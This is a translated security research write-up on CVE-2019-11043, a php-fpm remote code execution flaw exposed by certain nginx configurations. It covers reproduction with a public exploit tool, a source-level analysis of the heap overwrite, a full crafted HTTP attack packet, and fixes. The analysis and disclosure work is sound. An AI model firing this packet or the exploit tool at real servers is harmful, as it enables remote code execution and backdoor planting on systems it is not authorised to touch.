**Chinese version:**
In Real World CTF 2019 Quals, Andrew Danau, a security researcher, found that
when the %0a symbol was sent to the target server URL, the server returned an
exception and it was very likely to be a vulnerability.
On October 23, 2019, someone posted the details of the vulnerability and exp
on Github.. When nginx is not configured properly, it will cause php-fpm
remote arbitrary code execution.
Let's make an in-depth analysis of this vulnerability, and I also want to say
thanks to my coworkers @Hcamael from Knownsec 404-Team.
# Vulnerability reproduction
In order to make the recurrence, we use vulhub to build the vulnerability
environment.
    https://github.com/vulhub/vulhub/tree/master/php/CVE-2019-11043
`git pull` and `docker-compose up -d`
via `http://{your_ip}:8080/`
download exp from github (under go environment)
    go get -v github.com/neex/phuip-fpizdam
build
    go install github.com/neex/phuip-fpizdam
use exp to attack
    phuip-fpizdam http://{your_ip}:8080/
attack success
# Analysis
Before analyzing its principle, we can have a look at the patch.
-
We can found that the cause for the vulnerability is the controllable address
of `path_info` . Combined with the information given by the expert:
    The regexp in `fastcgi_split_path_info` directive can be broken using the newline character (in encoded form, %0a). Broken regexp leads to empty PATH_INFO, which triggers the bug.
That is to say, when `path_info` is truncated by %0a, `path_info` will be set
to null.
the `env_path_info` is the address of the variable `path_info`, `path_info` is
0 so `plien` is 0.
variable `slen` is the length of requested url.
        int ptlen = strlen(pt);
        int slen = len - ptlen;
    int len = script_path_translated_len;
    len is the length of url path
    when url is http://127.0.0.1/index.php/123%0atest.php
    script_path_translated from nginx config，is /var/www/html/index.php/123\ntest.php
    ptlen is the length of content is which before first slash in url path
    when url is http://127.0.0.1/index.php/123%0atest.php
    pt is /var/www/html/index.php
**The difference between these two variables is the length of the path behind.
Since the path is controllable,`path_info` can be controlled.**
We can set the value of any address to zero in line 1222. According to the
description of the vulnerability finder, by setting the value of the specified
address to zero, we can control the `char* pos` of `_fcgi_data_seg` structure
to zero.
the `script_name` is also from request configuration.
But why is it that setting the `char* pos` of `_fcgi_data_seg` structure to
zero can affect the result of `FCGI_PUTENV`?
Here we go deeper to see the definition of `FCGI_PUTENV`.
    char* fcgi_quick_putenv(fcgi_request *req, char* var, int var_len, unsigned int hash_value, char* val);
Follow function `fcgi_quick_putenv`
The function directly modify `request->env`, and this parameter is predefined.
Follow into the init function `fcgi_hash_init`.
We found `request->env` is the `fcgi_data_seg` structure. And `request->env`
is a global variable when the nginx and fastcgi communicate.
Some global variable will be defined in nginx config.
The variable will be stored in the corresponding location on the heap.
When it comes to exploit, we could control `path_info` to point to
`request->env` to set `request->env->pos` to zero.
Back to the function `fcgi_hash_set`
Follow into `fcgi_hash_strndup`
**Here the lowest bit of`h->data->pos` is set to 0 and the str is
controllable. This means we can write data in front of it.**
Now a new problem is that how could we write data into where we want?
Here we use the packet for example.
    GET /index.php/PHP_VALUE%0Asession.auto_start=1;;;?QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ HTTP/1.1
    Host: ubuntu.local:8080
    User-Agent: Mozilla/5.0
    D-Gisos: 8=====================================D
    Ebut: mamku tvoyu
In the packet, the last two parts of the header are to complete its function.
The `D-Gisos` is used to shift and write data to specified location.
**And`Ebut` will be converted to a global variables in `HTTP_EBUT`
(`fast_param` ) **.
First we need to understand how global variables in `fastcgi` get data.
We can see when fastcgi want to get the global variables, it will read the
length of the specified position for comparison, and then read a string as the
value.
This means **if the position is reasonable，the value of the var is the
same，and the length is the same，fastcgi will read the corresponding data**.
The `HTTP_EBUT` and `PHP_VALUE` have exactly the same length, so we can
confirm this from the changes in data on the heap。
Before covering, data of this address is,
And then execute `fcgi_quick_putenv`
The data transfered to
**We successfully write`PHP_VALUE` and controlled its contents, which means we
can control any global variables in PHP`**
When we can control and global variables in PHP, we hava many ways to attack.
Here we use the example in exp.
exp author sets up auto including, sets including path to `/tmp`, and sets log
file address to `/tmp/a` and write the payload into the log file. Finally, the
PHP file will automatically include log file to make a backdoor.
# Valunerability Repairing
We suggest two ways to fix this vulnerability.
  * Temporary ：
Modify nginx config file, and add this to relevant configuratoin
        try_files $uri =404
In this way, Nginx will check if the file exist, and the request will not be
transferred to php-fpm when it does not exist.
  * Official ：
    * Update PHP 7.1.X to 7.1.33 https://github.com/php/php-src/releases/tag/php-7.1.33
    * Update PHP 7.2.X to 7.2.24 https://github.com/php/php-src/releases/tag/php-7.2.24
    * Update PHP 7.3.X to 7.3.11 https://github.com/php/php-src/releases/tag/php-7.3.11
# Impact
1.Nginx + php_fpm + `location ~ [^/]\.php(/|$)` will transfer request to php-fpm. 2.Nginx + `fastcgi_split_path_info` and start with`^` and end with `$`.
Only in this way can we use %0a to break. ps: this will allow `index.php/321
-> index.php`
    fastcgi_split_path_info ^(.+?\.php)(/.*)$;
3.In `fastcgi_param`, `PATH_INFO` be set from `fastcgi_param PATH_INFO
$fastcgi_path_info;` . It will be defined by default in `fastcgi_params`.
4.There is no definition of file check in Nginx just like`try_files $uri
=404`，if it does, the request will not be transferred to php-fpm.
The impact of this vulnerability is limited since most Nginx configurations
have file check, and the default Nginx not have this problem.
But also bacause of this, most sample online or environments that do not take
this into consideration (the example configuration of Nginx and the default
environment of NextCloud) got this problem, and this vulnerability has become
a threat to other servers.
In this case, once a problematic configuration is spread, it may involve a
huge number of servers, and timely updating is always the best protection:>
